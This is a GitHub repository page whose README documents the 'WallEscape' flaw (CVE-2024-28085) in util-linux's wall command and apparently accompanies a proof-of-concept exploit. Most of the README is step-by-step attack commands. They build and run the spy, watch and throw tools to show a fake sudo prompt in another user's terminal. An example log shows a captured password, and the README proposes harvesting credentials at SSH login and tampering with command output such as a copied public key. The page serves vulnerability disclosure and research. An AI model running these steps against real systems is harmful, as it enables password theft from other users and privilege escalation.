
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fskyler-ferrante%2FCVE-2024-28085)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fskyler-ferrante%2FCVE-2024-28085)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=skyler-ferrante%2FCVE-2024-28085)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[skyler-ferrante](/skyler-ferrante)
/
**[CVE-2024-28085](/skyler-ferrante/CVE-2024-28085)**
Public

* [Notifications](/login?return_to=%2Fskyler-ferrante%2FCVE-2024-28085) You must be signed in to change notification settings
* [Fork
  7](/login?return_to=%2Fskyler-ferrante%2FCVE-2024-28085)
* [Star
   49](/login?return_to=%2Fskyler-ferrante%2FCVE-2024-28085)

WallEscape vulnerability in util-linux

[people.rit.edu/sjf5462/6831711781/wall\_2\_27\_2024.txt](https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt "https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt")

[49
stars](/skyler-ferrante/CVE-2024-28085/stargazers) [7
forks](/skyler-ferrante/CVE-2024-28085/forks) [Branches](/skyler-ferrante/CVE-2024-28085/branches) [Tags](/skyler-ferrante/CVE-2024-28085/tags) [Activity](/skyler-ferrante/CVE-2024-28085/activity)
 [Star](/login?return_to=%2Fskyler-ferrante%2FCVE-2024-28085)

 [Notifications](/login?return_to=%2Fskyler-ferrante%2FCVE-2024-28085) You must be signed in to change notification settings

* [Code](/skyler-ferrante/CVE-2024-28085)
* [Issues
  0](/skyler-ferrante/CVE-2024-28085/issues)
* [Pull requests
  0](/skyler-ferrante/CVE-2024-28085/pulls)
* [Actions](/skyler-ferrante/CVE-2024-28085/actions)
* [Projects
  0](/skyler-ferrante/CVE-2024-28085/projects)
* [Security](/skyler-ferrante/CVE-2024-28085/security)
* [Insights](/skyler-ferrante/CVE-2024-28085/pulse)

Additional navigation options

* [Code](/skyler-ferrante/CVE-2024-28085)
* [Issues](/skyler-ferrante/CVE-2024-28085/issues)
* [Pull requests](/skyler-ferrante/CVE-2024-28085/pulls)
* [Actions](/skyler-ferrante/CVE-2024-28085/actions)
* [Projects](/skyler-ferrante/CVE-2024-28085/projects)
* [Security](/skyler-ferrante/CVE-2024-28085/security)
* [Insights](/skyler-ferrante/CVE-2024-28085/pulse)

# skyler-ferrante/CVE-2024-28085

    main[Branches](/skyler-ferrante/CVE-2024-28085/branches)[Tags](/skyler-ferrante/CVE-2024-28085/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[12 Commits](/skyler-ferrante/CVE-2024-28085/commits/main/) | | |
| [exploit](/skyler-ferrante/CVE-2024-28085/tree/main/exploit "exploit") | | [exploit](/skyler-ferrante/CVE-2024-28085/tree/main/exploit "exploit") |  |  |
| [logo](/skyler-ferrante/CVE-2024-28085/tree/main/logo "logo") | | [logo](/skyler-ferrante/CVE-2024-28085/tree/main/logo "logo") |  |  |
| [report](/skyler-ferrante/CVE-2024-28085/tree/main/report "report") | | [report](/skyler-ferrante/CVE-2024-28085/tree/main/report "report") |  |  |
| [.gitignore](/skyler-ferrante/CVE-2024-28085/blob/main/.gitignore ".gitignore") | | [.gitignore](/skyler-ferrante/CVE-2024-28085/blob/main/.gitignore ".gitignore") |  |  |
| [README.md](/skyler-ferrante/CVE-2024-28085/blob/main/README.md "README.md") | | [README.md](/skyler-ferrante/CVE-2024-28085/blob/main/README.md "README.md") |  |  |
| [build.sh](/skyler-ferrante/CVE-2024-28085/blob/main/build.sh "build.sh") | | [build.sh](/skyler-ferrante/CVE-2024-28085/blob/main/build.sh "build.sh") |  |  |
| View all files | | |

## Repository files navigation

* README
# Wall-Escape (CVE-2024-28085)

The util-linux wall command does not filter escape sequences from
command line arguments. The vulnerable code was introduced in commit
[cdd3cc7fa4](https://github.com/util-linux/util-linux/commit/cdd3cc7fa4cafde492039180bb47f27ab8422261) (2013). Every version since has been vulnerable. A full report
can be found [here](https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt). I
have nicknamed this bug "WallEscape".

This exploit code was successful in leaking passwords on Ubuntu 22.04 with default configurations.

## Configure

Make sure the background color and username are set to appropriate values in
throw.c.

## Build and run

Attack setup

```
git clone https://github.com/skyler-ferrante/CVE-2024-28085.git
./build.sh
./spy > proc.log & ./watch "sudo systemctl start apache2"; ./watch "systemctl start apache2"; sleep .01; ./throw

```

I used `sudo systemctl start apache2` since it is short running without much output.
Make sure to kill spy after the exploit has run: `pkill spy`.

Then in another terminal

```
sudo su
sudo systemctl start apache2

```

It might not be necessary for the victim to call `su` depending on the system, and if accessing locally vs through ssh.

This should cause the fake sudo prompt to pop up in the victim terminal. Since
many systems leak commands that are not found, the victim password may show up in proc.log.

Example proc.log

```
sudo systemctl start apache2
systemctl start apache2
./throw
bash
/usr/bin/python3 /usr/lib/command-not-found -- Password123!
/usr/bin/snap advise-snap --format=json --command Password123!

```

# Note

Some people have misunderstood under what scenarios this could be used to attack another user. We do not need to attack sudo, we can attack anywhere the user inputs their password. On my system, after a user logs in using OpenSSH, the command `/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new` gets run.

For leaking passwords from Openssh users, imagine running the following:

```
./watch "sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new"; sleep 1; ./throw

```

We can then send a "password incorrect" message after a user can correctly login through SSH. Sudo was just the command I choose to demo, but there are many possible targets. Its not hard to imagine an attacker setting up a credential harvester, to harvest the credentials of every user that logins using SSH. This is possible from even the most unprivileged users, such as www-data.

This vulnerability also gives attackers the ability to change the output of any command. Imagine we waited for the command `cat ~/.ssh/id_rsa.pub"`. An attacker could change what the user copies for their public key. In the style of attack, we do not need a leaking primitive for commands not found.

## About

WallEscape vulnerability in util-linux

[people.rit.edu/sjf5462/6831711781/wall\_2\_27\_2024.txt](https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt "https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt")

### Topics

[exploit](/topics/exploit "Topic: exploit")
[vulnerability](/topics/vulnerability "Topic: vulnerability")
[cve](/topics/cve "Topic: cve")
[privilege-escalation](/topics/privilege-escalation "Topic: privilege-escalation")
[redteam](/topics/redteam "Topic: redteam")
[privesc](/topics/privesc "Topic: privesc")

### Resources

[Readme](#readme-ov-file)

[Activity](/skyler-ferrante/CVE-2024-28085/activity)
### Stars

[**49**
stars](/skyler-ferrante/CVE-2024-28085/stargazers)
### Watchers

[**1**
watching](/skyler-ferrante/CVE-2024-28085/watchers)
### Forks

[**7**
forks](/skyler-ferrante/CVE-2024-28085/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fskyler-ferrante%2FCVE-2024-28085&report=skyler-ferrante+%28user%29)

## [Releases](/skyler-ferrante/CVE-2024-28085/releases)

No releases published

## [Packages 0](/users/skyler-ferrante/packages?repo_name=CVE-2024-28085)

No packages published

## Languages

* [C
  97.5%](/skyler-ferrante/CVE-2024-28085/search?l=c)
* [Shell
  2.5%](/skyler-ferrante/CVE-2024-28085/search?l=shell)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

